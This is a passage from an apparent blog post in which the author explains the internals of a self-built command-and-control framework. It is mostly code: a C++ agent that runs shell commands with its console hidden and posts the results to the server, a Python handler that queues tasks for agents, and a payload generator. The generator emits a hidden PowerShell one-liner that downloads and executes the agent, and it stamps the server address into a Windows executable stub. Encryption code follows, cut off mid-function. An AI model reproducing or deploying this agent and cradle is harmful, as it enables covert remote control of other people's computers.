class="literal">NULL</span>,</span><br><span class="line">              hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"test"</span>,</span><br><span class="line">                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">                           WINHTTP_NO_PROXY_NAME,</span><br><span class="line">                           WINHTTP_NO_PROXY_BYPASS,</span><br><span class="line">                           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSession) &#123;</span><br><span class="line"></span><br><span class="line">        hConnect = WinHttpConnect(hSession,</span><br><span class="line">                                  sip.c_str(),</span><br><span class="line">                                  port,</span><br><span class="line">                                  <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hConnect) &#123;</span><br><span class="line"></span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect,</span><br><span class="line">                                      <span class="string">L"POST"</span>, suri.c_str(),</span><br><span class="line">                                      <span class="literal">NULL</span>,</span><br><span class="line">                                      WINHTTP_NO_REFERER,</span><br><span class="line">                                      WINHTTP_DEFAULT_ACCEPT_TYPES,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">                                      additionalHeaders,</span><br><span class="line">                                      headersLength,</span><br><span class="line">                                      (LPVOID)data,</span><br><span class="line">                                      data_len,</span><br><span class="line">                                      data_len,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))&#123;&#125;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                    response = response + <span class="built_in">std</span>::<span class="built_in">string</span>(pszOutBuffer);</span><br><span class="line">                    <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>shell</code> function does the almost the same thing as the <code>shell</code> function in the other agent, some of the code is taken from Stack Overflow and I edited it:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">CStringA <span class="title">shell</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CStringA result;</span><br><span class="line">    HANDLE hPipeRead, hPipeWrite;</span><br><span class="line"></span><br><span class="line">    SECURITY_ATTRIBUTES saAttr = &#123;<span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES)&#125;;</span><br><span class="line">    saAttr.bInheritHandle = TRUE; </span><br><span class="line">    saAttr.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!CreatePipe(&amp;hPipeRead, &amp;hPipeWrite, &amp;saAttr, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    STARTUPINFOW si = &#123;<span class="keyword">sizeof</span>(STARTUPINFOW)&#125;;</span><br><span class="line">    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">    si.hStdOutput  = hPipeWrite;</span><br><span class="line">    si.hStdError   = hPipeWrite;</span><br><span class="line">    si.wShowWindow = SW_HIDE; </span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOL fSuccess = CreateProcessW(<span class="literal">NULL</span>, (LPWSTR)cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (! fSuccess)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hPipeWrite);</span><br><span class="line">        CloseHandle(hPipeRead);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> bProcessEnded = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (; !bProcessEnded ;)</span><br><span class="line">    &#123;</span><br><span class="line">        bProcessEnded = WaitForSingleObject( pi.hProcess, <span class="number">50</span>) == WAIT_OBJECT_0;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">            DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">            DWORD dwAvail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!::PeekNamedPipe(hPipeRead, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;dwAvail, <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!dwAvail)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!::ReadFile(hPipeRead, buf, <span class="built_in">min</span>(<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, dwAvail), &amp;dwRead, <span class="literal">NULL</span>) || !dwRead)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            buf[dwRead] = <span class="number">0</span>;</span><br><span class="line">            result += buf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hPipeWrite);</span><br><span class="line">    CloseHandle(hPipeRead);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I would like to point out an important option in the process created by the <code>shell</code> function which is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">si.wShowWindow = SW_HIDE;</span><br></pre></td></tr></table></figure><p>This is responsible for hiding the console window, this is also added in the <code>main()</code> function of the agent to hide the console window:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ShowWindow(GetConsoleWindow(), SW_HIDE);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="Agent-Handler"><a href="#Agent-Handler" class="headerlink" title="Agent Handler"></a>Agent Handler</h2><p>Now that we’ve talked about the agents, let’s go back to the server and take a look at the agent handler.</p><p>An <code>Agent</code> object is instantiated with a name, a listener name, a remote address, a hostname, a type and an encryption key:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, listener, remoteip, hostname, Type, key)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.name      = name</span><br><span class="line">        self.listener  = listener</span><br><span class="line">        self.remoteip  = remoteip</span><br><span class="line">        self.hostname  = hostname</span><br><span class="line">        self.Type      = Type</span><br><span class="line">        self.key       = key</span><br></pre></td></tr></table></figure><p>Then it defines the sleep time which is 3 seconds by default as discussed, it needs to keep track of the sleep time to be able to determine if an agent is dead or not when removing an agent, otherwise it will keep waiting for the agent to call forever:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.sleept    = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>After that it creates the needed directories and files:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.Path      = <span class="string">"data/listeners/&#123;&#125;/agents/&#123;&#125;/"</span>.format(self.listener, self.name)</span><br><span class="line">self.tasksPath = <span class="string">"&#123;&#125;tasks"</span>.format(self.Path, self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.Path)</span><br></pre></td></tr></table></figure><p>And finally it creates the menu for the agent, but I won’t cover the <code>Menu</code> class in this post because it doesn’t relate to the core functionality of the tool.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.menu = menu.Menu(self.name)</span><br><span class="line">        </span><br><span class="line">self.menu.registerCommand(<span class="string">"shell"</span>, <span class="string">"Execute a shell command."</span>, <span class="string">"&lt;command&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"powershell"</span>, <span class="string">"Execute a powershell command."</span>, <span class="string">"&lt;command&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"sleep"</span>, <span class="string">"Change agent's sleep time."</span>, <span class="string">"&lt;time (s)&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"clear"</span>, <span class="string">"Clear tasks."</span>, <span class="string">""</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"quit"</span>, <span class="string">"Task agent to quit."</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">self.menu.uCommands()</span><br><span class="line"></span><br><span class="line">self.Commands = self.menu.Commands</span><br></pre></td></tr></table></figure><p>I won’t talk about the wrapper functions because we only care about the core functions.</p><p>First function is the <code>writeTask()</code> function, which is a quite simple function, it takes the task and prepends it with the <code>VALID</code> flag then it writes it to the tasks path:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeTask</span><span class="params">(self, task)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.Type == <span class="string">"p"</span>:</span><br><span class="line">        task = <span class="string">"VALID "</span> + task</span><br><span class="line">        task = ENCRYPT(task, self.key)</span><br><span class="line">    <span class="keyword">elif</span> self.Type == <span class="string">"w"</span>:</span><br><span class="line">        task = task</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(self.tasksPath, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(task)</span><br></pre></td></tr></table></figure><p>As you can see, it only encrypts the task in case of <code>powershell</code> agent only, that’s because there’s no encryption in the <code>c++</code> agent (more on that in the encryption part).</p><p>Second function I want to talk about is the <code>clearTasks()</code> function which just deletes the <code>tasks</code> file, very simple:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clearTasks</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.tasksPath):</span><br><span class="line">        os.remove(self.tasksPath)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Third function is a very important function called <code>update()</code>, this function gets called when an agent is renamed and it updates the paths. As seen earlier, the paths depend on the agent’s name, so without calling this function the agent won’t be able to download its tasks.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.menu.name = self.name</span><br><span class="line">    self.Path      = <span class="string">"data/listeners/&#123;&#125;/agents/&#123;&#125;/"</span>.format(self.listener, self.name)</span><br><span class="line">    self.tasksPath = <span class="string">"&#123;&#125;tasks"</span>.format(self.Path, self.name)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">        os.mkdir(self.Path)</span><br></pre></td></tr></table></figure><p>The remaining functions are wrappers that rely on these functions or helper functions that rely on the wrappers. One example is the <code>shell</code> function which just takes the command and writes the task:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(self, args)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(args) == <span class="number">0</span>:</span><br><span class="line">        error(<span class="string">"Missing command."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        command = <span class="string">" "</span>.join(args)</span><br><span class="line">        task    = <span class="string">"shell "</span> + command</span><br><span class="line">        self.writeTask(task)</span><br></pre></td></tr></table></figure><p>The last function I want to talk about is a helper function called <code>displayResults</code> which takes the sent results and the agent name. If the agent is a <code>powershell</code> agent it decrypts the results and checks their validity then prints them, otherwise it will just print the results:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">displayResults</span><span class="params">(name, result)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isValidAgent(name,<span class="number">0</span>) == <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result == <span class="string">""</span>:</span><br><span class="line">            success(<span class="string">"Agent &#123;&#125; completed task."</span>.format(name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">            key = agents[name].key</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> agents[name].Type == <span class="string">"p"</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    plaintext = DECRYPT(result, key)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> plaintext[:<span class="number">5</span>] == <span class="string">"VALID"</span>:</span><br><span class="line">                    success(<span class="string">"Agent &#123;&#125; returned results:"</span>.format(name))</span><br><span class="line">                    print(plaintext[<span class="number">6</span>:])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                success(<span class="string">"Agent &#123;&#125; returned results:"</span>.format(name))</span><br><span class="line">                print(result)</span><br></pre></td></tr></table></figure><h2 id="Payloads-Generator"><a href="#Payloads-Generator" class="headerlink" title="Payloads Generator"></a>Payloads Generator</h2><p>Any c2 server would be able to generate payloads for active listeners, as seen earlier in the agents part, we only need to change the <code>IP</code> address, port and key in the agent template, or just the <code>IP</code> address and port in case of the <code>c++</code> agent.</p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>Doing this with the <code>powershell</code> agent is simple because a <code>powershell</code> script is just a text file so we just need to replace the strings <code>REPLACE_IP</code>, <code>REPLACE_PORT</code> and <code>REPLACE_KEY</code>.</p><p>The <code>powershell</code> function takes a listener name, and an output name. It grabs the needed options from the listener then it replaces the needed strings in the <code>powershell</code> template and saves the new file in two places, <code>/tmp/</code> and the files path for the listener. After doing that it generates a download cradle that requests <code>/sc/</code> (the endpoint discussed in the listeners part).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">powershell</span><span class="params">(listener, outputname)</span>:</span></span><br><span class="line">    </span><br><span class="line">    outpath = <span class="string">"/tmp/&#123;&#125;"</span>.format(outputname)</span><br><span class="line">    ip      = listeners[listener].ipaddress</span><br><span class="line">    port    = listeners[listener].port</span><br><span class="line">    key     = listeners[listener].key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./lib/templates/powershell.ps1"</span>, <span class="string">"rt"</span>) <span class="keyword">as</span> p:</span><br><span class="line">        payload = p.read()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_IP'</span>,ip)</span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_PORT'</span>,str(port))</span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_KEY'</span>, key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(outpath, <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(listeners[listener].filePath, outputname), <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line">    oneliner = <span class="string">"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://&#123;&#125;:&#123;&#125;/sc/&#123;&#125;\')\""</span>.format(ip, str(port), outputname)</span><br><span class="line"></span><br><span class="line">    success(<span class="string">"File saved in: &#123;&#125;"</span>.format(outpath))</span><br><span class="line">    success(<span class="string">"One liner: &#123;&#125;"</span>.format(oneliner))</span><br></pre></td></tr></table></figure><h3 id="Windows-Executable-C-Agent"><a href="#Windows-Executable-C-Agent" class="headerlink" title="Windows Executable (C++ Agent)"></a>Windows Executable (C++ Agent)</h3><p>It wasn’t as easy as it was with the <code>powershell</code> agent, because the <code>c++</code> agent would be a compiled PE executable.</p><p>It was a huge problem and I spent a lot of time trying to figure out what to do, that was when I was introduced to the idea of a stub.</p><p>The idea is to append whatever data that needs to be dynamically assigned to the executable, and design the program in a way that it reads itself and pulls out the appended information.</p><p>In the source of the agent I added a few lines of code that do the following:</p><ul><li>Open the file as a file stream.</li><li>Move to the end of the file.</li><li>Read 2 lines.</li><li>Save the first line in the <code>IP</code> variable.</li><li>Save the second line in the port variable.</li><li>Close the file stream.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::ifstream <span class="title">ifs</span><span class="params">(argv[<span class="number">0</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">ifs.seekg(TEMPLATE_EOF);</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::getline(ifs, ip);</span><br><span class="line"><span class="built_in">std</span>::getline(ifs, sPort);</span><br><span class="line"></span><br><span class="line">ifs.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><p>To get the right <code>EOF</code> I had to compile the agent first, then update the agent source and compile again according to the size of the file.</p><p>For example this is the current definition of <code>TEMPLATE_EOF</code> for the <code>x64</code> agent:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEMPLATE_EOF 52736</span></span><br></pre></td></tr></table></figure><p>If we take a look at the size of the file we’ll find that it’s the same:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ls -la</span><br><span class="line">-rwxrwxr-x 1 ... ... 52736 ... ... ... winexe64.exe</span><br></pre></td></tr></table></figure><p>The <code>winexe</code> function takes a listener name, an architecture and an output name, grabs the needed options from the listener and appends them to the template corresponding to the selected architecture and saves the new file in <code>/tmp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">winexe</span><span class="params">(listener, arch, outputname)</span>:</span></span><br><span class="line"></span><br><span class="line">    outpath = <span class="string">"/tmp/&#123;&#125;"</span>.format(outputname)</span><br><span class="line">    ip      = listeners[listener].ipaddress</span><br><span class="line">    port    = listeners[listener].port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">"x64"</span>:</span><br><span class="line">        copyfile(<span class="string">"./lib/templates/winexe/winexe64.exe"</span>, outpath)</span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">"x32"</span>:</span><br><span class="line">        copyfile(<span class="string">"./lib/templates/winexe/winexe32.exe"</span>, outpath)        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(outpath, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">"&#123;&#125;\n&#123;&#125;"</span>.format(ip,port))</span><br><span class="line"></span><br><span class="line">    success(<span class="string">"File saved in: &#123;&#125;"</span>.format(outpath))</span><br></pre></td></tr></table></figure><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><p>I’m not very good at cryptography so this part was the hardest of all. At first I wanted to use <code>AES</code> and do Diffie-Hellman  key exchange between the server and the agent. However I found that <code>powershell</code> can’t deal with big integers without the <code>.NET</code> class <code>BigInteger</code>, and because I’m not sure that the class would be always available I gave up the idea and decided to hardcode the key while generating the payload because I didn’t want to risk the compatibility of the agent. I could use <code>AES</code> in <code>powershell</code> easily, however I couldn’t do the same in <code>c++</code>, so I decided to use a simple <code>xor</code> but again there were some issues, that’s why the <code>winexe</code> agent won’t be using any encryption until I figure out what to do. </p><p>Let’s take a look at the crypto functions in both the server and the <code>powershell</code> agent.</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>The <code>AESCipher</code> class uses the <code>AES</code> class from the <code>pycrypto</code> library, it uses <code>AES CBC 256</code>. </p><p>An <code>AESCipher</code> object is instantiated with a key, it expects the key to be <code>base-64</code> encoded:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.key = base64.b64decode(key)</span><br><span class="line">        self.bs  = AES.block_size</span><br></pre></td></tr></table></figure><p>There are two functions to pad and unpad the text with zeros to match the block size:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s + (self.bs - len(s) % self.bs) * <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    s = s.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">return</span> s.rstrip(<span class="string">"\x00"</span>)</span><br></pre></td></tr></table></figure><p>The encryption function takes plain text, pads it, creates a random <code>IV</code>, encrypts the plain text and returns the <code>IV</code> + the cipher text <code>base-64</code> encoded:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">    </span><br><span class="line">    raw      = self.pad(raw)</span><br><span class="line">    iv       = Random.new().read(AES.block_size)</span><br><span class="line">    cipher   = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">    